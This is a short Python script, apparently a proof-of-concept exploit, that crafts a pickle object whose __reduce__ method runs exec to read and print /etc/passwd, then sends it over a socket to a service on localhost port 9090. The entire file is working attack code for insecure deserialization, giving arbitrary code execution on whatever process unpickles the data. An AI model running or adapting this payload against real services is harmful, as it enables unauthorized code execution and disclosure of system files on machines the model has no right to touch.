#!/usr/bin/env python3

import socket, pickle, builtins

HOST = "127.0.0.1"
PORT = 9090

class Pickle(object):
    def __reduce__(self):
        return (builtins.exec, ("with open('/etc/passwd','r') as r: print(r.readlines())",))

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
    sock.connect((HOST,PORT))
    sock.sendall(pickle.dumps(Pickle()))
    